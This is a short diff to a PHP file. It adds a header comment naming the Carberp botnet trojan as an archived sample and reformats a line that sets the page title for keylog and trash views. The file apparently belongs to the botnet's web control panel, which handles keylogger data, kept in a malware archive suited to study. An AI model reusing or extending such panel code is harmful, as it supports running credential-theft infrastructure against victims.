@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 get_function('html_pages');
@@ -32,7 +43,8 @@ if(!empty($Cur['id'])){
 		if($Cur['ajax'] == 1){
 			if($Cur['y'] == 1){
 				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $lang['trash'] . ' - ' . $prog->name.'\';</script>');
-			}else{				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $prog->name.'\';</script>');
+			}else{
+				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $prog->name.'\';</script>');
 			}
 		}else{
 			if($Cur['y'] == 1){
